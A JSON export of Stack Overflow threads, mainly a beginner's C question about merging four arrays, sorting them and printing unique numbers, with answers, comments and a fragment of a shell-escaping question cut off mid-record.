"link": "https://stackoverflow.com/users/2805305/bolov"}, "edited": false, "score": 0, "creation_date": 1449683991, "post_id": 34181374, "comment_id": 56117809, "body": "1 function. 19 repetitive structures. Maintenance limbo. Debugging hell. Only One could save them all. The One. His name is Stack Overflow."}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "reply_to_user": {"reputation": 57967, "user_id": 2805305, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/442d249754d1725d9510cf06fa46b964?s=128&d=identicon&r=PG&f=1", "display_name": "bolov", "link": "https://stackoverflow.com/users/2805305/bolov"}, "edited": false, "score": 0, "creation_date": 1449684892, "post_id": 34181374, "comment_id": 56118378, "body": "@bolov Added comments. Now it&#39;s easier to understand how simple is the program. I am a newbie btw."}, {"owner": {"reputation": 57967, "user_id": 2805305, "user_type": "registered", "accept_rate": 79, "profile_image": "https://www.gravatar.com/avatar/442d249754d1725d9510cf06fa46b964?s=128&d=identicon&r=PG&f=1", "display_name": "bolov", "link": "https://stackoverflow.com/users/2805305/bolov"}, "edited": false, "score": 0, "creation_date": 1449685238, "post_id": 34181374, "comment_id": 56118609, "body": "@Aldi good job. When you learn about functions you should start immediately to take advantage of them: as many and as small as possible, each doing one thing and doing it well. For now, it&#39;s good enough. I wasn&#39;t necessary criticizing you, but unfortunately, that&#39;s how code by beginners looks. And hard as hell to debug, which adds to the difficulty of learning."}], "answers": [{"comments": [{"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449674634, "post_id": 34182314, "comment_id": 56111195, "body": "Unfortunately, this doesn&#39;t work. I keep getting numbers like 58359348. :("}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449675510, "post_id": 34182314, "comment_id": 56111854, "body": "That&#39;s because you didn&#39;t chage it properly."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449675699, "post_id": 34182314, "comment_id": 56112003, "body": "@Aldi I have added code to the answer."}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449676376, "post_id": 34182314, "comment_id": 56112538, "body": "Did you test your code and it worked? Because i still see wrong numbers at the output."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "reply_to_user": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449677208, "post_id": 34182314, "comment_id": 56113161, "body": "@Aldi yes I tested the code. I also tested some half-changed code following your earlier remark, and saw the wrong numbers. I&#39;ll post my program output in a moment."}], "tags": [], "owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "is_accepted": false, "score": 0, "last_activity_date": 1449677308, "last_edit_date": 1449677308, "creation_date": 1449674069, "answer_id": 34182314, "question_id": 34181374, "link": "https://stackoverflow.com/questions/34181374/c-code-to-print-the-unique-numbers-of-an-array/34182314#34182314", "title": "C code to print the unique numbers of an array", "body": "<p>When you merge <code>a_b</code> with <code>c_d</code> you have the sizes back to front with</p>\n\n<pre><code>while(i&lt;size3+size4 &amp;&amp; j&lt;size1+size2)\n</code></pre>\n\n<p>This should be </p>\n\n<pre><code>while(i&lt;size1+size2 &amp;&amp; j&lt;size3+size4)\n</code></pre>\n\n<p>The same applies below when you merge the remaining parts of the arrays, and these have an additional problem: instead of repeating the <code>while</code> loops you used to build <code>a_b</code> and <code>c_d</code> you've used a different technique. I suggest revisiting this section building <code>e</code>, and making it work like you did when buildling <code>a_b</code> and <code>c_d</code>.</p>\n\n<p>Here is the corrected code - except I didn't look at the part after the creation of <code>e[]</code> as I am not sure what you are trying to do.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    int size1 = 4, a[] = {1,1,1,2};\n    int size2 = 4, b[] = {2,2,2,3};\n    int size3 = 4, c[] = {3,3,3,4};\n    int size4 = 5, d[] = {4,4,4,5,6};\n    int a_b[30], c_d[30], e[30];\n    int i,j,k,t, sizefull;\n\n    sizefull=size1+size2+size3+size4;\n    printf(\"%d\\n\", sizefull);\n\n    i=j=k=0;\n    while (i &lt; size1 &amp;&amp; j &lt; size2) \n    {\n        if (a[i] &lt;= b[j]) \n            {\n            a_b[k] = a[i];\n            i++;\n            k++;\n            }\n       else {\n            a_b[k] = b[j];\n            k++;\n            j++;\n            }\n    }\n    while (i &lt; size1) \n    {\n        a_b[k] = a[i];\n        i++;\n        k++;\n    }\n    while (j &lt; size2) \n    {\n        a_b[k] = b[j];\n        k++;\n        j++;\n    }\n    printf(\"\\nMerged array is :\");\n    for (i = 0; i &lt; size1 + size2; i++)\n        printf(\"%d \", a_b[i]);\n\n    i=j=k=0;\n    while (i &lt; size3 &amp;&amp; j &lt; size4) {\n        if (c[i] &lt;= d[j]) {\n            c_d[k] = c[i];\n            i++;\n            k++;\n        } else {\n            c_d[k] = d[j];\n            k++;\n            j++;\n        }\n    }\n    while (i &lt; size3) {\n        c_d[k] = c[i];\n        i++;\n        k++;\n    }\n    while (j &lt; size4) {\n        c_d[k] = d[j];\n        k++;\n        j++;\n    }\n    printf(\"\\nMerged array is :\");\n    for (i = 0; i &lt; size3 + size4; i++)\n        printf(\"%d \", c_d[i]);\n\n    i=j=k=0;\n    while (i &lt; size1+size2 &amp;&amp; j &lt; size3+size4) \n    {\n        if (a_b[i] &lt;= c_d[j]) \n            {\n            e[k] = a_b[i];\n            i++;\n            k++;\n            }\n       else {\n            e[k] = c_d[j];\n            k++;\n            j++;\n            }\n    }\n    while (i &lt; size1+size2) \n    {\n        e[k] = a_b[i];\n        i++;\n        k++;\n    }\n    while (j &lt; size3+size4) \n    {\n        e[k] = c_d[j];\n        k++;\n        j++;\n    }\n\n    printf(\"\\n After merging: \\n\");\n    for (i = 0; i &lt; sizefull; i++)\n    {\n        printf(\"%d \", e[i]);\n    }\n\n    for (i=0;i&lt;sizefull;i++)\n    {\n        for(j=i+1;j&lt;sizefull;j++)\n        {\n            if(e[i]&gt;e[j])\n            {\n                t=e[i];\n                e[i]=e[j];\n                e[j]=t;\n            }\n        }\n    }\n    printf(\"\\nAscending Order is:\");\n    for(j=0;j&lt;sizefull;j++)\n    {\n        printf(\"%d \",e[j]);\n    }\n\n    printf(\"\\n\\n Final Array is \\n\");\n    for(i=0;i&lt;sizefull;i++)\n    {\n        printf(\" %d\",e[i]);\n    }\n\n    for(i=0; i&lt;sizefull;)\n    {\n        for(j = (i + 1); j&lt;sizefull; j++)\n        {\n            if( e[i] != e[j])\n                break;\n        }\n        printf(\"\\nunique element = %d, at index = %d\\n\", e[i], i);\n        printf(\"\\nunique element = %d, at index = %d\\n\", e[i], i);\n        i = j;\n        return 0;\n    }\n}\n</code></pre>\n\n<p>Program output:</p>\n\n<pre><code>17\n\nMerged array is :1 1 1 2 2 2 2 3\nMerged array is :3 3 3 4 4 4 4 5 6\n After merging:\n1 1 1 2 2 2 2 3 3 3 3 4 4 4 4 5 6\nAscending Order is:1 1 1 2 2 2 2 3 3 3 3 4 4 4 4 5 6\n\n Final Array is\n 1 1 1 2 2 2 2 3 3 3 3 4 4 4 4 5 6\nunique element = 1, at index = 0\n\nunique element = 1, at index = 0\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449675690, "post_id": 34182602, "comment_id": 56111997, "body": "Unfortunately your method doesn&#39;t work. :("}], "tags": [], "owner": {"reputation": 480, "user_id": 4462413, "user_type": "registered", "accept_rate": 83, "profile_image": "https://i.stack.imgur.com/KqFVA.png?s=128&g=1", "display_name": "Anish Sharma", "link": "https://stackoverflow.com/users/4462413/anish-sharma"}, "is_accepted": false, "score": 0, "last_activity_date": 1449674879, "creation_date": 1449674879, "answer_id": 34182602, "question_id": 34181374, "link": "https://stackoverflow.com/questions/34181374/c-code-to-print-the-unique-numbers-of-an-array/34182602#34182602", "title": "C code to print the unique numbers of an array", "body": "<p>Well First, You should try to put some comments on your code so that it becomes easy for others to read your code at one go. And I can see a lot of errors in your code. You have taken incorrect sizes of arrays ans also a for loop of yours is incorrect. The loop after you printed your final array  <code>for(i=0; i&lt;sizefull;)</code> is not correct.\nI will try to provide a simple solution to your problem.\nFirst, merge the four arrays, Second, perform a sorting algorithm(bubble, say), then try to find unique numbers from them. </p>\n\n<pre><code>int main()\n{\n    int size1, size2, size3, size4,sizefull,a[30],b[30],c[30],d[30],e[120];      \n    int i,j,t,match,temp;\n    printf(\"Insert the size of A: \");\n        scanf(\"%d\",&amp;size1);\n    printf(\"Insert %d elements of A:\\n\", size1);\n    for(i=0;i&lt;size1;i++)\n        scanf(\"%d\",&amp;a[i]);\n    printf(\"Insert the size of B: \");\n        scanf(\"%d\",&amp;size2);\n    printf(\"Insert %d elements of B:\\n\", size2);\n    for(i=0;i&lt;size2;i++)\n        scanf(\"%d\",&amp;b[i]);\n    printf(\"Insert the size of C: \");\n        scanf(\"%d\",&amp;size3);\n    printf(\"Insert %d elements of C:\\n\", size3);\n    for(i=0;i&lt;size3;i++)\n        scanf(\"%d\",&amp;c[i]);\n    printf(\"Insert the size of D: \");\n        scanf(\"%d\",&amp;size4);\n    printf(\"Insert %d elements of D:\\n\", size4);\n    for(i=0;i&lt;size4;i++)\n        scanf(\"%d\",&amp;d[i]);\n    sizefull=size1+size2+size3+size4;\n    //The below code is for copying.\n    i=0;\n    j=0;\n    while(i&lt;size1)  \n    {\n             e[j]=a[i];\n             i++;\n             j++;\n    }\n    i=0;\n    while(i&lt;size2)  \n    {\n             e[j]=b[i];\n             i++;\n             j++;\n    }\n    i=0;\n    while(i&lt;size3)  \n    {\n             e[j]=c[i];\n             i++;\n             j++;\n    }\n    i=0;\n    while(i&lt;size4)  \n    {\n             e[j]=d[i];\n             i++;\n             j++;\n    }\n     //bubble sort\n    for(i=0;i&lt;sizfull-i;i++)\n    {\n         for(j=0;j&lt;sizefull-i;j++)\n         {\n              if(e[j]&gt;e[j+1])\n              {\n                  temp=e[j];\n                  e[j]=e[j+1];\n                  e[j+1]=temp;\n              }\n         }\n    }\n    //Code below is for finding and printing unique numbers.\n    for(i=0;i&lt;sizefull-1;i++)\n    {\n        match=0; \n        for(j=i+1;j&lt;sizefull;j++)\n         {\n             if(e[i]==e[j])\n             {\n                 match++;\n                 break;\n             }\n         }\n         if(match==0)\n         printf(\"unique number=%d at index %d\",e[i],i);\n    }\n\n\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "edited": false, "score": 0, "creation_date": 1449681140, "post_id": 34184297, "comment_id": 56115945, "body": "Based on OP&#39;s comment. looks like the title is wrong. The 4 arrays may not sorted. They could each be sorted, and then merged, or concatenated and then sorted. It&#39;s not clear which is to be done."}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449697741, "post_id": 34184297, "comment_id": 56125610, "body": "@rcgldr Okay, thanks for your help :)"}, {"owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "edited": false, "score": 0, "creation_date": 1449697967, "post_id": 34184297, "comment_id": 56125742, "body": "@AntoineMathys - I misunderstood the print uniques part, fixed it now, using a single loop, taking advantage of the fact that the array is sorted."}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449698560, "post_id": 34184297, "comment_id": 56126005, "body": "@rcgldr I just updated my code."}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449727803, "post_id": 34184297, "comment_id": 56135564, "body": "@rcgldr Thank you for your help. I will test it."}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449728206, "post_id": 34184297, "comment_id": 56135737, "body": "@rcgldr Unfortunately the code, doesn&#39;t work. It returns 2 errors and exits. (fatal error: no input files and Invalid argument)"}, {"owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "reply_to_user": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449728715, "post_id": 34184297, "comment_id": 56135949, "body": "@Aldi - strange, I&#39;ve run it with a redirected input file and with manual input. I&#39;m running on WIndows, using Visual Studio, what are you using?"}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449740891, "post_id": 34184297, "comment_id": 56142249, "body": "@rcgldr I am using Code::Blocks. (i am a CS student btw)"}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449779825, "post_id": 34184297, "comment_id": 56166681, "body": "@rcgldr Thank you! I had an issue with the compiler! Your code is great!"}, {"owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "reply_to_user": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449786753, "post_id": 34184297, "comment_id": 56170398, "body": "@Aldi - good to see it&#39;s working now. I deleted my prior comments to clean things up a bit."}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449934617, "post_id": 34184297, "comment_id": 56225083, "body": "@rcgldr Is there any other way without using stable values on the arrays at first (a[64])? Because we don&#39;t know if the user may enter more than 64 values or not."}, {"owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "reply_to_user": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449945385, "post_id": 34184297, "comment_id": 56228686, "body": "@Aldi - If the user inputs one line of data on the console, and only 80 characters, that&#39;s 40 single digit values at most.  To handle variable size, change the arrays to be pointers to integers, and malloc room for 64 integers (malloc(64*sizeof(int)). If while reading data, you get to 64 integers, then realloc to 128 integers, then if needed, realloc to 256 integers, and so on, doubling the number of integers with each realloc. Once a, b, c, d are read, then use malloc for a_b, c_d, and e, based on the sizes of a, b, c, d. Don&#39;t forget to free them just before program exit."}, {"owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "edited": false, "score": 0, "creation_date": 1449946011, "post_id": 34184297, "comment_id": 56228865, "body": "@rcgldr All right, thank you for your clear answer! :)"}], "tags": [], "owner": {"reputation": 22874, "user_id": 3282056, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/IXonK.jpg?s=128&g=1", "display_name": "rcgldr", "link": "https://stackoverflow.com/users/3282056/rcgldr"}, "is_accepted": true, "score": 0, "last_activity_date": 1449866442, "last_edit_date": 1449866442, "creation_date": 1449679560, "answer_id": 34184297, "question_id": 34181374, "link": "https://stackoverflow.com/questions/34181374/c-code-to-print-the-unique-numbers-of-an-array/34184297#34184297", "title": "C code to print the unique numbers of an array", "body": "<p>Changed example code to get user input. The merge part is the same as Antoine Mathys answer, so this code example mostly shows a simple way to print unique numbers from a sorted array. Added qsort() calls to sort the 4 arrays, since it's not clear if the arrays were supposed to be already sorted.</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n#include &lt;string.h&gt;\n\n/* print unique numbers from sorted array */\nvoid print_uniques(int x[], int sizex)\n{\nint i, j;\n    if(sizex == 0)\n        return;\n    i = j = 0;\n    while(i != sizex){\n        i++;\n        if(i != sizex &amp;&amp; x[i] == x[j])\n            continue;\n        if((i - j) == 1)\n            printf(\"%d\\n\", x[j]);\n        j = i;\n    }\n}\n\n/* merge two already sorted arrays */\nvoid merge(int m[], int x[], int sizex, int y[], int sizey)\n{\nint i=0, j=0, k=0;\n    while (i &lt; sizex &amp;&amp; j &lt; sizey) \n    {\n        if (x[i] &lt;= y[j]) \n            m[k++] = x[i++];\n        else \n            m[k++] = y[j++];\n    }\n    while (i &lt; sizex) \n        m[k++] = x[i++];\n    while (j &lt; sizey) \n        m[k++] = y[j++];\n}\n\n/* compare function for qsort() */\nint cmp(const int *i, const int *j)\n{\n    return *i - *j;\n}\n\n/* get data (no size check) */\nint getdata(int x[], char l)\n{\nint s, i;\n    printf(\"Enter the number of elements for %c : \", l);\n    if(0 == scanf(\"%d\", &amp;s))\n        return 0;\n    for(i = 0; i &lt; s; i++){\n        printf(\"Enter an element for %c : \", l);\n        scanf(\"%d\", x+i);\n    }\n    return s;\n}\n\nint main()\n{\nint a[64], b[64], c[64], d[64];\nint a_b[128], c_d[128];\nint e[256];\nint sizea, sizeb, sizec, sized;\nint sizea_b, sizec_d, sizee;\n\n    sizea = getdata(a, 'A');\n    sizeb = getdata(b, 'B');\n    sizec = getdata(c, 'C');\n    sized = getdata(d, 'D');\n\n    sizea_b = sizea   + sizeb;\n    sizec_d = sizec   + sized;\n    sizee   = sizea_b + sizec_d;\n\n    /* sort the arrays */\n    qsort(a, sizea, sizeof(a[0]), cmp);\n    qsort(b, sizeb, sizeof(b[0]), cmp);\n    qsort(c, sizec, sizeof(c[0]), cmp);\n    qsort(d, sized, sizeof(d[0]), cmp);\n\n    /* merge the arrays */\n    merge(a_b, a, sizea, b, sizeb);\n    merge(c_d, c, sizec, d, sized);\n    merge(e, a_b, sizea_b, c_d, sizec_d);\n\n    printf(\"\\n\");\n    print_uniques(e, sizee);\n\n    return 0;\n}\n</code></pre>\n\n<p>Alternate get data that lets user input multiple elements on a single line without having to specify the number of elements.</p>\n\n<pre><code>/* get data (no size check) */\nint getdata(int x[], char l)\n{\nchar d[] = \" ,\\t\\n\";\nchar t[80];\nint i = 0;\nchar *pt;\n    printf(\"enter element(s) for %c :\\n\", l);\n    if(NULL == fgets(t, sizeof(t), stdin))\n        return 0;\n    pt = strtok(t, d);\n    while(pt){\n        sscanf(pt, \"%d\", x+i);\n        i++;\n        pt = strtok(NULL, d);\n    }\n    return i;\n}\n</code></pre>\n"}], "owner": {"reputation": 588, "user_id": 5560212, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/8af457cdc25eae2efbcfb8af6b97bb7c?s=128&d=identicon&r=PG", "display_name": "aldi", "link": "https://stackoverflow.com/users/5560212/aldi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1224, "favorite_count": 0, "closed_date": 1449687224, "accepted_answer_id": 34184297, "answer_count": 3, "score": 0, "last_activity_date": 1532093619, "creation_date": 1449671553, "last_edit_date": 1532093619, "question_id": 34181374, "link": "https://stackoverflow.com/questions/34181374/c-code-to-print-the-unique-numbers-of-an-array", "closed_reason": "Needs details or clarity", "title": "C code to print the unique numbers of an array", "body": "<p>I want to create a C program that merges 4 unsorted arrays, sort them and print all the unique numbers from the new merged array.\nThe results are not correct, but i don't know why.\nHere is an example: </p>\n\n<ol>\n<li>a[1,5,13,3]</li>\n<li>b[3,5,9,1,23]</li>\n<li>c[5,23,3,18]</li>\n<li>d[1]</li>\n<li>a_b[1,5,13,3,3,5,9,1,23]</li>\n<li>c_d[5,23,3,18,1]</li>\n<li>e[1,1,1,3,3,3,5,5,5,9,13,18,23,23]</li>\n</ol>\n\n<h2>Prints only the unique numbers from array e: <em>13,18,9</em></h2>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nvoid print_uniques(int x[], int sizex)\n{\nint i, j;\nif(sizex == 0)\n    return;\nif(sizex == 1){\n    printf(\"%d\\n\", x[0]);\n    return;\n}\ni = j = 0;\nwhile(i != sizex){\n    i++;\n    if(i != sizex &amp;&amp; x[i] == x[j])\n        continue;\n    if((i - j) == 1)\n        printf(\"%d\\n\", x[j]);\n    j = i;\n}\n}\n\n/* print unique numbers from sorted array */\n\n/* merge two already sorted arrays */\nvoid merge(int m[], int x[], int sizex, int y[], int sizey)\n{\nint i=0, j=0, k=0;\nwhile (i &lt; sizex &amp;&amp; j &lt; sizey)\n{\n    if (x[i] &lt;= y[j])\n        m[k++] = x[i++];\n    else\n        m[k++] = y[j++];\n}\nwhile (i &lt; sizex)\n    m[k++] = x[i++];\nwhile (j &lt; sizey)\n    m[k++] = y[j++];\n}\n\n/* compare function for qsort() */\nint cmp(const int *i, const int *j)\n{\nreturn *i - *j;\n} \n\nint main()\n{\nint i, j,a[30],b[30],c[30],d[30],sizea,sizeb,sizec,sized;\nprintf(\"Enter the size of array A: \");\nscanf(\"%d\",&amp;sizea);\nprintf(\"Enter the %d elements of array A:\\n\", sizea);\nfor(i=0;i&lt;sizea;i++)\nscanf(\"%d\",&amp;a[i]);\nprintf(\"Enter the size of array B: \");\nscanf(\"%d\",&amp;sizeb);\nprintf(\"Enter the %d elements of array B:\\n\", sizeb);\nfor(i=0;i&lt;sizeb;i++)\nscanf(\"%d\",&amp;b[i]);\nprintf(\"Enter the size of array C: \");\nscanf(\"%d\",&amp;sizec);\nprintf(\"Eisagete ta %d stoixeia tou pinaka C:\\n\", sizec);\nfor(i=0;i&lt;sizec;i++)\nscanf(\"%d\",&amp;c[i]);\nprintf(\"Eisagete to mege8os tou pinaka D: \");\nscanf(\"%d\",&amp;sized);\nprintf(\"Eisagete ta %d stoixeia tou pinaka D:\\n\", sized);\nfor(i=0;i&lt;sized;i++)\nscanf(\"%d\",&amp;d[i]);\nint a_b[32];\nint c_d[32];\nint e[64];\nint sizea_b, sizec_d, sizee;\n\nsizea = sizeof(a)/sizeof(a[0]);\nsizeb = sizeof(b)/sizeof(b[0]);\nsizec = sizeof(c)/sizeof(c[0]);\nsized = sizeof(d)/sizeof(d[0]);\nsizea_b = sizea   + sizeb;\nsizec_d = sizec   + sized;\nsizee   = sizea_b + sizec_d;\n\n/* sort the arrays */\nqsort(a, sizea, sizeof(a[0]), cmp);\nqsort(b, sizeb, sizeof(b[0]), cmp);\nqsort(c, sizec, sizeof(c[0]), cmp);\nqsort(d, sized, sizeof(d[0]), cmp);\n\n/* merge the arrays */\nmerge(a_b, a, sizea, b, sizeb);\nmerge(c_d, c, sizec, d, sized);\nmerge(e, a_b, sizea_b, c_d, sizec_d);\n\nprint_uniques(e, sizee);\n\nreturn 0;\n}\n</code></pre>\n\n<p>Any help is appreciated!</p>\n"}, {"tags": ["c"], "comments": [{"owner": {"reputation": 52685, "user_id": 980550, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/8emhY.jpg?s=128&g=1", "display_name": "lurker", "link": "https://stackoverflow.com/users/980550/lurker"}, "edited": false, "score": 2, "creation_date": 1449671482, "post_id": 34181239, "comment_id": 56108768, "body": "The encoding evidently has a literal backslash and nothing in your pipeline of system commands interprets it. One way to get it to interpret the escapes is: <code>&quot;echo -e $(printf &#39;H4sIAIM4aFYCAwtJLS6JyQsBklwAMrDLnwsAAAA=&#39; | base64 -d | gunzip) &gt; r&quot;</code>"}, {"owner": {"reputation": 2748, "user_id": 2879338, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/e1Inh.jpg?s=128&g=1", "display_name": "Milind Dumbare", "link": "https://stackoverflow.com/users/2879338/milind-dumbare"}, "edited": false, "score": 0, "creation_date": 1449671489, "post_id": 34181239, "comment_id": 56108780, "body": "may be an extra &quot;\\&quot; before &quot;\\n&quot;?"}, {"owner": {"reputation": 95, "user_id": 2671410, "user_type": "registered", "accept_rate": 82, "profile_image": "https://graph.facebook.com/1141598977/picture?type=large", "display_name": "Kris", "link": "https://stackoverflow.com/users/2671410/kris"}, "edited": false, "score": 0, "creation_date": 1449841373, "post_id": 34181239, "comment_id": 56193767, "body": "Encoding with -e was the answer so lurker&#39;s solution was best in my case. Thank You all for Your contribution!"}], "answers": [{"comments": [{"owner": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 1449672015, "post_id": 34181528, "comment_id": 56109206, "body": "Although you have identified valid problems with the OP&#39;s code, you have not addressed the question he actually posed.  Your corrections will not fix it."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "reply_to_user": {"reputation": 120941, "user_id": 2402272, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/1182b1d5518a596d4e8cfe0567a65c4d?s=128&d=identicon&r=PG", "display_name": "John Bollinger", "link": "https://stackoverflow.com/users/2402272/john-bollinger"}, "edited": false, "score": 0, "creation_date": 